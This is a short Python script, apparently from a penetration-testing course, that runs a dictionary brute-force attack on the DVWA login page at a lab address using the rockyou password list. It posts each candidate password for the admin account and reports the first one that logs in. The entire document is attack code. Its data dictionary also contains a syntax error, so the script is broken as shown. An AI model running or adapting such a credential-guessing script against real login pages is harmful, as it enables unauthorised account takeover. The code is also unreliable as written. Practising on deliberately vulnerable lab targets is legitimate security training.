#!/usr/bin/env python

import requests

target_url = "http://10.0.2.20/dvwa/login.php"
data_dict = {"username": "admin", "password", "", "Login": "submit"}

# print(response.content)

# dictionary to discover passwords     
with open("/root/Downloads/rockyou2021.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word 
        response = requests.post(target_url, data=data_dict)
        # cast to string to work on python3
        if "Login failed" not in str(response.content):
            print("[+] Got the password -->" + word)
            exit()

print("[+] Reached end of line.")
            